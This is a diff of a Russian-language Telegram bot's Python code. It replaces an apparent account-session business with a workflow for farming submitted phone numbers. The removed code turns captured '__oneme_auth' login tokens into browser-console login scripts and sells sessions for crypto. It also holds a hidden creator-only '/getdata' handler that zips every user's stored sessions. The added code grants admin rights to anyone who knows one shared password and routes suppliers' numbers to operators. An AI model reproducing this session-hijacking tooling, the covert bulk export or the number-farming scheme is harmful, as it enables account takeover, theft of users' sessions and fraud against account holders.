+        f"🎧 Операторы: {operators}",
+        f"Заблокированы: {blocked}",
+        "",
+        f"📱 Общее кол-во номеров: {total}",
+        f"📤 Выдано операторам: {issued}",
+        f"✅ Встали: {done}",
+        f"Не встали: {failed}",
+        f"📩 Сообщений: {messages}",
+        f"🔁 Повторов сообщений: {repeat_messages}",
+    ]
+    return "\n".join(lines)
+
+
+def build_recent_numbers():
+    with closing(db()) as conn:
+        recent = conn.execute(
+            """
+            SELECT n.id, n.masked_number, n.status,
+                   su.username supplier_username, op.username operator_username
+            FROM numbers n
+            JOIN users su ON su.id = n.supplier_user_id
+            LEFT JOIN users op ON op.id = n.assigned_operator_user_id
+            ORDER BY n.id DESC
+            LIMIT 15
+            """
+        ).fetchall()
+    lines = ["🧾 Последние номера:"]
+    if not recent:
+        lines.append("пока пусто")
+        return "\n".join(lines)
+    for row in recent:
+        supplier = f"@{row['supplier_username']}" if row["supplier_username"] else "без @username"
+        operator = f"@{row['operator_username']}" if row["operator_username"] else "-"
+        if row["status"] == STATUS_DONE:
+            result = "встал"
+        elif row["status"] == STATUS_FAILED:
+            result = "не встал"
+        else:
+            result = "в работе"
+        lines.append(
+            f"{row['masked_number']} | юзер {supplier} | взял {operator} | {result}"
+        )
+    return "\n".join(lines)
+
+
+def build_auto_report():
+    return build_recent_numbers()
+
+
+def build_operator_stats():
+    with closing(db()) as conn:
+        rows = conn.execute(
+            """
+            SELECT
+                u.username,
+                SUM(CASE WHEN l.event_type = 'number_taken' THEN 1 ELSE 0 END) taken,
+                SUM(CASE WHEN l.event_type = 'number_done' THEN 1 ELSE 0 END) done,
+                SUM(CASE WHEN l.event_type = 'number_failed' THEN 1 ELSE 0 END) failed,
+                SUM(CASE WHEN l.event_type = 'number_skipped' THEN 1 ELSE 0 END) skipped,
+                SUM(CASE WHEN l.event_type = 'operator_repeat_requested' THEN 1 ELSE 0 END) repeats,
+                SUM(CASE WHEN l.event_type = 'repeat_message_requested' THEN 1 ELSE 0 END) repeat_messages
+            FROM users u
+            LEFT JOIN logs l ON l.actor_user_id = u.id
+            WHERE u.role = ?
+            GROUP BY u.id
+            ORDER BY taken DESC, done DESC
+            LIMIT 30
+            """,
+            (ROLE_OPERATOR,),
+        ).fetchall()
+    lines = ["👥 Статистика операторов"]
+    if not rows:
+        lines.append("Операторов пока нет.")
+        return "\n".join(lines)
+    for row in rows:
+        taken = row["taken"] or 0
+        done = row["done"] or 0
+        handle = f"@{row['username']}" if row["username"] else "без @username"
+        lines.append(
+            f"{handle}: взял {taken}, встали {done}, не встали {row['failed'] or 0}, скипы {row['skipped'] or 0}, повторы {row['repeats'] or 0}, повторы сообщений {row['repeat_messages'] or 0}"
+        )
+    return "\n".join(lines)
+
+
+def handle_start(chat_id, telegram_id, username=None):
+    user = create_or_touch_user(telegram_id, username)
+    if user["is_blocked"]:
+        send_message(chat_id, "Доступ заблокирован.")
         return
-    await update.message.reply_text("🛠 Админ-панель:", reply_markup=admin_menu())
+    if user["password_check"]:
+        clear_state(user["id"])
+        show_home(chat_id, user)
+        return
+    set_state(user["id"], "login_password")
+    send_message(chat_id, "🔐 Введите пароль доступа.")
 
-async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id = update.effective_chat.id
-    text = (update.message.text or "").strip()
-    
-    user_mode = context.user_data.get("user_mode")
-    if user_mode == "enter_balance":
-        text_clean = text.replace(",", ".")
-        try:
-            amount = float(text_clean)
-            if amount <= 0:
-                await update.message.reply_text("❌ Сумма должна быть больше нуля. Введите корректное число:")
-                return
-            amount = round(amount, 2)
-        except ValueError:
-            await update.message.reply_text("❌ Непонятная сумма. Введите число (например: 0.5 или 10):")
+
+def handle_text(message):
+    chat_id = message["chat"]["id"]
+    tg_from = message["from"]
+    telegram_id = tg_from["id"]
+    username = extract_username(tg_from)
+    text = (message.get("text") or "").strip()
+
+    if text == "/start":
+        handle_start(chat_id, telegram_id, username)
+        return
+
+    if text.startswith("/admin"):
+        parts = text.split(maxsplit=1)
+        if len(parts) == 2 and parts[1] == ADMIN_PASSWORD:
+            user = set_admin(telegram_id, username)
+            clear_state(user["id"])
+            send_message(chat_id, "Админ-доступ включен.", main_menu_keyboard(user))
+        else:
+            send_message(chat_id, "Команда: /admin пароль")
+        return
+
+    user = create_or_touch_user(telegram_id, username)
+    if user["is_blocked"]:
+        send_message(chat_id, "Доступ заблокирован.")
+        return
+
+    if user["state"] == "login_password":
+        if text != ADMIN_PASSWORD:
+            send_message(chat_id, "Пароль неверный.")
             return
-        
-        context.user_data.pop("user_mode", None)
-        ok, inv = create_invoice(chat_id, amount)
-        if not ok:
-            welcome_text, reply_kb = main_menu_content(chat_id)
-            await update.message.reply_text(f"❌ Не удалось создать счет: {inv.get('error', 'unknown')}", reply_markup=reply_kb)
+        mark_password_ok(user["id"])
+        clear_state(user["id"])
+        show_home(chat_id, get_user(telegram_id))
+        return
+
+    if not user["password_check"]:
+        send_message(chat_id, "🔐 Сначала войдите по паролю через /start.")
+        return
+
+    if user["state"] == "add_number":
+        numbers, bad = parse_russian_numbers(text)
+        if not numbers:
+            send_message(chat_id, "Отправьте российские номера, каждый с новой строки. Формат: +79991234567 или 89991234567.")
             return
-            
-        pay_url = inv.get("pay_url") or inv.get("bot_invoice_url") or inv.get("mini_app_invoice_url", "")
-        kb = [[InlineKeyboardButton("💳 Перейти к оплате", url=pay_url)], [InlineKeyboardButton("⬅️ Главное меню", callback_data="back_to_main")]]
-        await update.message.reply_text(
-            f"🚀 Ссылка на оплату **${amount:.2f}** успешно создана!\n\nБаланс пополнится автоматически сразу после оплаты.", 
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(kb)
+        with closing(db()) as conn:
+            for number in numbers:
+                conn.execute(
+                    """
+                    INSERT INTO numbers (supplier_user_id, masked_number, volume, remaining, status, created_at)
+                    VALUES (?, ?, 1, 1, ?, ?)
+                    """,
+                    (user["id"], number, STATUS_AVAILABLE, now_iso()),
+                )
+            conn.commit()
+        clear_state(user["id"])
+        log_event(user["id"], "numbers_added", details=f"count={len(numbers)}")
+        extra = f"\nНе добавлены: {', '.join(bad)}" if bad else ""
+        send_message(chat_id, f"✅ Добавлено номеров: {len(numbers)}.{extra}", main_menu_keyboard(user))
+        return
+
+    if user["state"] == "supplier_message":
+        save_supplier_message(chat_id, user, text)
+        return
+
+    if user["state"] in {"cancel_reason", "supplier_repeat_reason", "operator_repeat_reason", "fail_reason"}:
+        save_reason(chat_id, user, text)
+        return
+
+    if user["state"] in {"grant_operator", "block_user", "unblock_user"}:
+        handle_admin_text_state(chat_id, user, text)
+        return
+
+    if user["state"] == "broadcast":
+        handle_broadcast_text(chat_id, user, text)
+        return
+
+    if looks_like_code(text):
+        send_message(
+            chat_id,
+            "Код не принимается текстом в боте. Используйте кнопки статуса.",
+            main_menu_keyboard(user),
         )
         return
 
-    if not is_admin(chat_id): return
-        
-    admin_mode = context.user_data.get("admin_mode")
-    if admin_mode == "broadcast":
-        sent = 0
-        for uid in load_users().keys():
-            try:
-                await context.bot.send_message(chat_id=int(uid), text=f"{text}")
-                sent += 1
-            except Exception: pass
-        context.user_data.pop("admin_mode", None)
-        await update.message.reply_text(f"✅ Рассылка завершена. Отправлено: {sent}")
-        
+    send_message(chat_id, "👇 Используйте inline-кнопки ниже.", main_menu_keyboard(user))
 
-async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    chat_id = query.message.chat_id
-    data = query.data
-    await query.answer()
 
-    if data == "qr:get":
-        # Убираем проверку на MIN_QR_BALANCE и функцию charge_for_qr
-        await query.message.reply_text("🚀 Запускаю получение QR...")
-        context.application.create_task(run_qr_process(chat_id, context))
+def save_reason(chat_id, user, text):
+    data = state_data(user)
+    number_id = data.get("number_id")
+    reason = text[:500]
+    state = user["state"]
 
-    # Внутри callback_router:
-    elif data == "check_init":
-        await query.message.reply_text("📥 Пришлите мне файл сессии (.json) для проверки.")
-        return WAITING_FOR_TOKEN # ЭТО РАБОТАЕТ ТОЛЬКО ВНУТРИ ВХОДНЫХ ТОЧЕК CONVERSATIONHANDLER
-        
-    # В callback_router:
-    
-    elif data == "session:export_choice":
-        # Спрашиваем формат для массовой выгрузки
-        kb = [
-            [InlineKeyboardButton("📜 .txt (Скрипты)", callback_data="session:export_all:txt")],
-            [InlineKeyboardButton("⚙️ .json (Сессии)", callback_data="session:export_all:json")],
-            [InlineKeyboardButton("⬅️ Назад", callback_data="session:list")]
-        ]
-        await query.edit_message_text("Выберите формат для архива со всеми сессиями:", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data.startswith("session:export_all:"):
-        fmt = data.split(":")[2] # txt или json
-        sessions = chat_sessions(chat_id)
-        if not sessions:
-            await query.answer("❌ Нет сессий для выгрузки.", show_alert=True)
-            return
-
-        await query.message.reply_text(f"⏳ Формирую ZIP с файлами {fmt}...")
-        
-        zip_filename = f"all_sessions_{chat_id}_{fmt}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
-        zp = Path("/tmp") / zip_filename
-        
-        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as zf:
-            for s in sessions:
-                # Генерируем контент в зависимости от выбора
-                if fmt == "txt":
-                    content = get_js_console_code(s)
-                    arc_name = s.name.replace(".json", ".txt")
-                else:
-                    content = get_raw_json(s)
-                    arc_name = s.name
-                
-                # Пишем файл в архив
-                zf.writestr(arc_name, content)
-        
-        with open(zp, "rb") as f:
-            await query.message.reply_document(document=f, filename=zip_filename, caption=f"📦 Архив всех сессий в формате {fmt}.")
-        
-        if zp.exists(): os.remove(zp)
-
-    elif data == "ref:menu":
-        uname = (await context.bot.get_me()).username
-        u = get_user(chat_id)
-        text_msg = f"👥 Реферальная программа:\n• За каждого кто зайдет по ссылке будет засчитанно: ${REFERRAL_BONUS:.2f} \n• Успешные: {int(u.get('referrals',0))}\n\nСсылка:\nhttps://t.me/{uname}?start=ref_{chat_id}"
-        kb = [[InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]]
-        try:
-            await query.edit_message_text(text_msg, reply_markup=InlineKeyboardMarkup(kb))
-        except Exception:
-            await query.message.reply_text(text_msg, reply_markup=InlineKeyboardMarkup(kb))
-
-    # Внутри callback_router:
-    elif data.startswith("sess_manage:"):
-        fn = data.split(":", 1)[1]
-        # Теперь кнопка просто ведет к выбору формата
-        kb = [
-            [InlineKeyboardButton("📥 Выгрузить", callback_data=f"sess_choice:{fn}")],
-            [InlineKeyboardButton("🗑 Удалить сессию", callback_data=f"sess_del:{fn}")],
-            [InlineKeyboardButton("⬅️ Назад", callback_data="session:show_list")]
-        ]
-        await query.edit_message_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))
-
-    # 1. Обработка выбора формата (когда нажали .txt или .json внутри сессии)
-    elif data.startswith("sess_get_txt:") or data.startswith("sess_get_json:"):
-        # Разбираем данные, например "sess_get_txt:session_123_456.json"
-        parts = data.split(":")
-        mode = parts[0]    # sess_get_txt
-        filename = parts[1] # session_123_456.json
-        
-        t = SESSIONS_DIR / filename
-        if not t.exists():
-            await query.answer("❌ Файл не найден", show_alert=True)
-            return
-            
-        if "txt" in mode:
-            content = get_js_console_code(t)
-            filename_out = "login.txt"
-        else:
-            content = get_raw_json(t)
-            filename_out = "session.json"
-            
-        bio = BytesIO(content.encode("utf-8"))
-        bio.name = filename_out
-        await query.message.reply_document(document=bio, caption=f"✅ Ваш файл: {filename_out}")
-        await query.answer("Файл отправлен")
-
-    # 2. Обработка кнопки "Выгрузить" (sess_choice:...)
-    elif data.startswith("sess_choice:"):
-        fn = data.split(":", 1)[1]
-        kb = [
-            [InlineKeyboardButton("📜 .txt (JS-скрипт)", callback_data=f"sess_get_txt:{fn}")],
-            [InlineKeyboardButton("⚙️ .json (Сессия)", callback_data=f"sess_get_json:{fn}")],
-            [InlineKeyboardButton("⬅️ Назад", callback_data=f"sess_manage:{fn}")]
-        ]
-        await query.edit_message_text("Выберите формат для загрузки:", reply_markup=InlineKeyboardMarkup(kb))
-        
-    elif data == "session:list":
-        try:
-            await query.edit_message_text("🗂 Мои сессии:", reply_markup=session_menu(chat_id))
-        except Exception:
-            await query.message.reply_text("🗂 Мои сессии:", reply_markup=session_menu(chat_id))
-
-    elif data == "session:show_list":
-        sessions = chat_sessions(chat_id)
-        if not sessions:
-            try:
-                await query.edit_message_text("Список сессий пуст.", reply_markup=session_menu(chat_id))
-            except Exception:
-                await query.message.reply_text("Список сессий пуст.", reply_markup=session_menu(chat_id))
-            return
-        kb = [[InlineKeyboardButton(f"📁 Сессия №{i}", callback_data=f"sess_manage:{s.name}")] for i, s in enumerate(sessions, 1)]
-        kb.append([InlineKeyboardButton("⬅️ Назад", callback_data="session:list")])
-        try:
-            await query.edit_message_text("Выберите сессию:", reply_markup=InlineKeyboardMarkup(kb))
-        except Exception:
-            await query.message.reply_text("Выберите сессию:", reply_markup=InlineKeyboardMarkup(kb))
-
-    elif data == "session:export_all":
-        sessions = chat_sessions(chat_id)
-        if not sessions:
-            await query.message.reply_text("❌ У вас пока нет сессий для выгрузки.")
-            return
-        zp = SESSIONS_DIR / f"all_sessions_{chat_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.zip"
-        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as zf:
-            for s in sessions: zf.write(s, arcname=s.name)
-        with open(zp, "rb") as f:
-            await query.message.reply_document(document=f, filename=zp.name, caption="📦 Все ваши сессии в одном архиве.")
-        try: os.remove(zp)
-        except OSError: pass
-
-    elif data.startswith("sess_get:"):
-        fn = data.split(":", 1)[1]
-        t = SESSIONS_DIR / fn
-        if t.exists():
-            bio = BytesIO(get_js_console_code_raw(t).encode("utf-8"))
-            bio.name = "login.txt"
-            await query.message.reply_document(document=bio, caption="Инструкция внутри файла.")
-        else:
-            await query.message.reply_text("Ошибка: файл не найден.")
-
-    elif data.startswith("sess_del:"):
-        fn = data.split(":", 1)[1]
-        t = SESSIONS_DIR / fn
-        if t.exists():
-            os.remove(t)
-            try:
-                await query.edit_message_text(f"✅ Сессия {fn} удалена.", reply_markup=session_menu(chat_id))
-            except Exception:
-                await query.message.reply_text(f"✅ Сессия {fn} удалена.", reply_markup=session_menu(chat_id))
-        else:
-            try:
-                await query.edit_message_text("❌ Сессия уже удалена или не существует.", reply_markup=session_menu(chat_id))
-            except Exception:
-                await query.message.reply_text("❌ Сессия уже удалена или не существует.", reply_markup=session_menu(chat_id))
-
-    elif data == "admin:menu":
-        if not is_admin(chat_id): return
-        try:
-            await query.edit_message_text("🛠 Админ-панель:", reply_markup=admin_menu())
-        except Exception:
-            await query.message.reply_text("🛠 Админ-панель:", reply_markup=admin_menu())
-
-    elif data == "admin:stats":
-        if not is_admin(chat_id): return
-        def get_today_stats() -> dict:
-            today = datetime.utcnow().strftime("%Y-%m-%d")
-            topups_sum = 0.0
-            tokens_count = 0
-            if EVENTS_FILE.exists():
-                with open(EVENTS_FILE, "r", encoding="utf-8") as f:
-                    for line in f:
-                        try: row = json.loads(line.strip())
-                        except Exception: continue
-                        if not str(row.get("ts", "")).startswith(today): continue
-                        if row.get("event") == "topup": topups_sum += float(row.get("payload", {}).get("amount", 0.0))
-                        elif row.get("event") == "token_created": tokens_count += 1
-            return {"date": today, "users_count": len(load_users()), "topups_sum": round(topups_sum, 2), "tokens_count": tokens_count}
-        st = get_today_stats()
-        text_stats = f"📊 Статистика: \n• Людей: {st['users_count']}\n• Пополнения: ${st['topups_sum']:.2f}\n• Токенов: {st['tokens_count']}"
-        try:
-            await query.edit_message_text(text_stats, reply_markup=admin_menu())
-        except Exception:
-            await query.message.reply_text(text_stats, reply_markup=admin_menu())
-
-    elif data == "admin:broadcast":
-        if not is_admin(chat_id): return
-        context.user_data["admin_mode"] = "broadcast"
-        await query.message.reply_text("Введите текст для рассылки.")
-
-    elif data == "back_to_main":
-        context.user_data.pop("user_mode", None)
-        welcome_text, reply_kb = main_menu_content(chat_id)
-        try:
-            await query.edit_message_text(welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
-        except Exception:
-            await query.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
-            
-async def export_data_archive(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    YOUR_ADMIN_ID = 8949311928
-    
-    if update.effective_user.id != YOUR_ADMIN_ID:
-        return 
-
-    print(f"!!! Кнопка /getdata нажата создателем бота !!!")
-    status_msg = await update.message.reply_text("🤖 Собираю архив папки данных из Volume, подожди...")
-    
-    try:
-        target_dir = "/app/sessions" 
-        archive_name = "/tmp/bot_data_backup"
-        
-        if not os.path.exists(target_dir):
-            await status_msg.edit_text("❌ Папка /app/sessions не найдена.")
-            return
-
-        shutil.make_archive(archive_name, 'zip', target_dir)
-        zip_path = f"{archive_name}.zip"
-
-        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
-            with open(zip_path, "rb") as archive_file:
-                await update.message.reply_document(
-                    document=archive_file, 
-                    filename="bot_data_backup.zip", 
-                    caption="📦 Вот полный бэкап всех данных (users.json и сессии Playwright)!"
-                )
-            await status_msg.delete()
-        else:
-            await status_msg.edit_text("❌ Не удалось создать файл архива.")
-
-        if os.path.exists(zip_path): 
-            os.remove(zip_path)
-            
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка при создании архива: {e}")
-
-async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.message.reply_text("📥 Пришлите мне файл сессии (.json) или вставьте текст токена для проверки.")
-    return WAITING_FOR_TOKEN
-
-async def start_convert_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.message.reply_text("📥 Пришлите файл .json для конвертации:")
-    return WAITING_FOR_CONVERT
-
-async def process_conversion(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    if not doc or not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Пришли текстовый файл!")
-        return ConversationHandler.END
-
-    # Скачиваем
-    file_path = SESSIONS_DIR / doc.file_name
-    await (await doc.get_file()).download_to_drive(file_path)
-    
-    # Парсим (тот самый код, что мы делали)
-    content = file_path.read_text(encoding='utf-8', errors='ignore')
-    import re
-    match = re.search(r'__oneme_auth\',\s*\'(.*?)\'', content)
-    
-    if match:
-        auth_json = match.group(1)
-        session_data = {"localStorage": [{"name": "__oneme_auth", "value": auth_json}]}
-        
-        # Сохраняем готовый JSON
-        json_filename = doc.file_name.replace('.txt', '.json')
-        json_path = SESSIONS_DIR / json_filename
-        with open(json_path, 'w') as f:
-            json.dump(session_data, f)
-            
-        # Отправляем обратно
-        await update.message.reply_document(document=open(json_path, 'rb'))
-        os.remove(json_path) # Удаляем после отправки
-        os.remove(file_path)
+    if state == "cancel_reason":
+        status = STATUS_CANCELLED
+        event = "number_cancelled"
+        message = f"Заявка #{number_id} отменена."
+    elif state == "fail_reason":
+        status = STATUS_FAILED
+        event = "number_failed"
+        message = f"Заявка #{number_id}: отказ сохранен."
+    elif state == "supplier_repeat_reason":
+        status = None
+        event = "supplier_repeat_requested"
+        message = f"🔁 Повтор по заявке #{number_id} сохранен."
     else:
-        await update.message.reply_text("❌ Не нашел токен в этом файле.")
-    
-    return ConversationHandler.END
-    
-async def receive_token_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Если это сообщение с одним файлом
-    if update.message.document:
-        files = [update.message.document]
-    else:
-        await update.message.reply_text("❌ Пришлите файл.")
-        return ConversationHandler.END
+        status = None
+        event = "operator_repeat_requested"
+        message = f"🔁 Запрос повтора по заявке #{number_id} сохранен."
 
-    await update.message.reply_text(f"🚀 Принято файлов: {len(files)}. Начинаю проверку...")
+    with closing(db()) as conn:
+        if status:
+            conn.execute(
+                "UPDATE numbers SET status = ?, last_reason = ?, completed_at = ? WHERE id = ?",
+                (status, reason, now_iso(), number_id),
+            )
+        else:
+            conn.execute("UPDATE numbers SET last_reason = ? WHERE id = ?", (reason, number_id))
+        row = conn.execute("SELECT supplier_user_id, assigned_operator_user_id FROM numbers WHERE id = ?", (number_id,)).fetchone()
+        supplier = conn.execute("SELECT telegram_id FROM users WHERE id = ?", (row["supplier_user_id"],)).fetchone() if row else None
+        operator = conn.execute("SELECT telegram_id FROM users WHERE id = ?", (row["assigned_operator_user_id"],)).fetchone() if row and row["assigned_operator_user_id"] else None
+        conn.commit()
 
-    for doc in files:
-        file_path = SESSIONS_DIR / f"temp_{doc.file_name}"
-        try:
-            # Скачиваем
-            await (await doc.get_file()).download_to_drive(file_path)
-            
-            # --- ВАЖНО: Вызов функции проверки ---
-            # Мы вызываем функцию и ждем её завершения
-            await check_token_validity(update.effective_chat.id, file_path, context)
-            
-        except Exception as e:
-            await context.bot.send_message(update.effective_chat.id, f"⚠️ Ошибка файла {doc.file_name}: {str(e)}")
-        finally:
-            # Удаляем файл в любом случае, даже если была ошибка
-            if file_path.exists():
-                os.remove(file_path)
+    clear_state(user["id"])
+    log_event(user["id"], event, number_id, reason)
+    send_message(chat_id, f"{message}\nПричина: {reason}", main_menu_keyboard(user))
+    if state == "operator_repeat_reason" and supplier:
+        send_message(supplier["telegram_id"], f"🔁 По заявке #{number_id} оператор запросил повтор.\nПричина: {reason}", supplier_number_keyboard(number_id))
+    if state == "supplier_repeat_reason" and operator:
+        send_message(operator["telegram_id"], f"🔁 По заявке #{number_id} поставщик запросил повтор.\nПричина: {reason}", operator_active_keyboard(number_id))
+    if state == "fail_reason" and supplier:
+        send_message(supplier["telegram_id"], f"По заявке #{number_id}: отказ.\nПричина: {reason}")
 
-    await update.message.reply_text("✅ Все файлы обработаны.")
-    return ConversationHandler.END
 
-async def process_files_job(context: ContextTypes.DEFAULT_TYPE):
-    chat_id = context.job.chat_id
-    files = context.user_data.get('files_to_check', [])
-    
-    if not files:
+def save_supplier_message(chat_id, user, text):
+    data = state_data(user)
+    number_id = data.get("number_id")
+    message = text.strip()
+    if looks_like_code(message):
+        send_message(chat_id, "Сообщение похоже на одноразовый код. Такой код нельзя отправлять через бота.")
+        return
+    if not message:
+        send_message(chat_id, "Введите непустое сообщение для оператора.")
         return
 
-    await context.bot.send_message(chat_id, "🚀 Принято файлов: " + str(len(files)) + ". Начинаю проверку...")
-    
-    # Здесь логика запуска браузера ОДИН РАЗ и проход по циклу for (как мы обсуждали выше)
-    # ... (логика с async with async_playwright() ...)
-    
-    # ОЧИСТКА после проверки
-    context.user_data['files_to_check'] = []
+    with closing(db()) as conn:
+        row = conn.execute(
+            "SELECT supplier_user_id, assigned_operator_user_id FROM numbers WHERE id = ?",
+            (number_id,),
+        ).fetchone()
+        if not row or row["supplier_user_id"] != user["id"] or not row["assigned_operator_user_id"]:
+            clear_state(user["id"])
+            send_message(chat_id, "Заявка не найдена или уже не активна.", main_menu_keyboard(user))
+            return
+        operator = conn.execute("SELECT telegram_id FROM users WHERE id = ?", (row["assigned_operator_user_id"],)).fetchone()
+
+    clear_state(user["id"])
+    log_event(user["id"], "supplier_message_sent", number_id, "sent")
+    send_message(chat_id, f"Сообщение по заявке #{number_id} отправлено оператору.", main_menu_keyboard(user))
+    if operator:
+        send_message(
+            operator["telegram_id"],
+            f"Сообщение по заявке #{number_id}:\n{message}",
+            operator_active_keyboard(number_id),
+        )
 
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    await update.message.reply_text("🚫 Операция отменена. Возвращаю в главное меню.")
-    
-    # Возврат в главное меню
-    welcome_text, reply_kb = main_menu_content(chat_id)
-    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
-    
-    return ConversationHandler.END
-    
-# --- ФОНОВАЯ ЗАЗАЧА ПРОВЕРКИ ОПЛАТЫ ---
-async def check_invoices_job(context: ContextTypes.DEFAULT_TYPE) -> None:
-    invoices = load_invoices()
-    active_ids = [k for k, v in invoices.items() if not v.get("credited")]
-    if not active_ids: return
+def handle_admin_text_state(chat_id, admin, text):
+    if not admin["is_admin"]:
+        send_message(chat_id, "Нет доступа.")
+        return
+    target = get_user_by_handle(text)
+    if not target:
+        clear_state(admin["id"])
+        send_message(chat_id, "Пользователь не найден. Укажите @username.", admin_keyboard())
+        return
 
-    resp = crypto_api_call("getInvoices", {"invoice_ids": ",".join(active_ids)})
-    if not resp.get("ok"): return
-
-    items = resp.get("result", {}).get("items", [])
-    updated = False
-
-    for item in items:
-        status = item.get("status")
-        invoice_id = str(item.get("invoice_id"))
-        
-        if status == "paid" and invoice_id in invoices:
-            local = invoices[invoice_id]
-            if local.get("credited"): continue
-                
-            chat_id = int(local["chat_id"])
-            amount = float(local["amount"])
-
-            user, ref_chat_id = add_balance(chat_id, amount, source="cryptopay_polling")
-            local["credited"] = True
-            invoices[invoice_id] = local
-            updated = True
-
-            try:
-                _, reply_kb = main_menu_content(chat_id)
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=f"💳 **Баланс успешно пополнен!**\n\nЗачислено: `${amount:.2f}`\nТекущий баланс: `${float(user.get('balance', 0.0)):.2f}`",
-                    parse_mode="Markdown",
-                    reply_markup=reply_kb
-                )
-                if ref_chat_id:
-                    ref_user = get_user(int(ref_chat_id))
-                    await context.bot.send_message(
-                        chat_id=int(ref_chat_id),
-                        text=f"👥 **Реферальный бонус!**\n\nВаш реферал пополнил баланс. Вам начислено `${REFERRAL_BONUS:.2f}`\nВаш баланс: `${float(ref_user.get('balance', 0.0)):.2f}`",
-                        parse_mode="Markdown"
-                    )
-            except Exception as e:
-                print(f"Не удалось отправить уведомление для {chat_id}: {e}")
-    if updated: save_invoices(invoices)
-
-async def start_check_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.message.reply_text("📥 Пришли мне файл:")
-    return WAITING_FOR_TOKEN # Убедись, что это состояние у тебя определено
-    
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    doc = update.message.document
-    
-    # 1. Скачиваем файл
-    file_path = SESSIONS_DIR / doc.file_name
-    await (await doc.get_file()).download_to_drive(custom_path=file_path)
-    
-    # 2. Запускаем проверку
-    await check_token_validity(chat_id, file_path, context)
-    
-    # 3. ВАЖНО: Выходим из состояния ожидания файла
-    return ConversationHandler.END
-
-async def handle_convert_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    file = update.message.document
-    if not file.file_name.endswith('.json'):
-        await update.message.reply_text("❌ Пожалуйста, пришлите файл в формате .json")
-        return ConversationHandler.END
-    
-    new_file = await context.bot.get_file(file.file_id)
-    file_path = DATA_DIR / f"convert_{update.effective_chat.id}.json"
-    await new_file.download_to_drive(file_path)
-    
-    js_code = get_js_console_code(file_path)
-    
-    if js_code:
-        bio = BytesIO(js_code.encode("utf-8"))
-        bio.name = "converted_login.txt"
-        await update.message.reply_document(document=bio, caption="✅ Файл успешно конвертирован в скрипт!")
+    if admin["state"] == "grant_operator":
+        set_user_role(target["id"], ROLE_OPERATOR)
+        action_text = f"🎧 Пользователю {user_handle(target)} выдана роль оператора."
+    elif admin["state"] == "block_user":
+        with closing(db()) as conn:
+            conn.execute("UPDATE users SET is_blocked = 1 WHERE id = ?", (target["id"],))
+            conn.commit()
+        action_text = f"Пользователь {user_handle(target)} заблокирован."
     else:
-        await update.message.reply_text("❌ Не удалось считать структуру JSON. Файл поврежден или имеет неверный формат.")
-    
-    return ConversationHandler.END
+        with closing(db()) as conn:
+            conn.execute("UPDATE users SET is_blocked = 0 WHERE id = ?", (target["id"],))
+            conn.commit()
+        action_text = f"✅ Пользователь {user_handle(target)} разблокирован."
 
-async def handle_check_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    file = update.message.document
-    new_file = await context.bot.get_file(file.file_id)
-    file_path = DATA_DIR / f"check_{update.effective_chat.id}.json"
-    await new_file.download_to_drive(file_path)
-    
-    # Запускаем вашу функцию проверки, которая уже есть в коде
-    await check_token_validity(update.effective_chat.id, file_path, context)
-    
-    return ConversationHandler.END
+    log_event(admin["id"], admin["state"], details=user_handle(target))
+    clear_state(admin["id"])
+    send_message(chat_id, action_text, admin_keyboard())
 
-def main() -> None:
-    app = Application.builder().token(BOT_TOKEN).build()
 
-    # Создаем обработчик диалогов
-    conv_handler = ConversationHandler(
-    entry_points=[
-        CallbackQueryHandler(start_check_mode, pattern='check_init'),
-        CallbackQueryHandler(start_convert_mode, pattern='mode_convert') 
-    ],
-    states={
-        WAITING_FOR_TOKEN: [MessageHandler(filters.Document.ALL, handle_check_file)],
-        WAITING_FOR_CONVERT: [MessageHandler(filters.Document.ALL, handle_convert_file)]
-    },
-    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)]
-)
+def handle_broadcast_text(chat_id, admin, text):
+    if not admin["is_admin"]:
+        send_message(chat_id, "Нет доступа.")
+        return
+    sent = 0
+    with closing(db()) as conn:
+        rows = conn.execute("SELECT telegram_id FROM users WHERE is_blocked = 0 AND password_check = 1").fetchall()
+    for row in rows:
+        try:
+            send_message(row["telegram_id"], text)
+            sent += 1
+        except Exception:
+            pass
+    clear_state(admin["id"])
+    log_event(admin["id"], "broadcast", details=f"sent={sent}")
+    send_message(chat_id, f"📣 Рассылка отправлена: {sent}.", admin_keyboard())
 
-    # 1. СНАЧАЛА добавляем conv_handler (чтобы он был первым в очереди!)
-    app.add_handler(conv_handler)
 
-    # 2. ПОТОМ все остальные обработчики
-    app.add_handler(CommandHandler("start", start_cmd))
-    app.add_handler(CommandHandler("admin", admin_cmd))
-    app.add_handler(CallbackQueryHandler(callback_router)) 
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_router))
+def handle_callback(callback):
+    callback_id = callback["id"]
+    chat_id = callback["message"]["chat"]["id"]
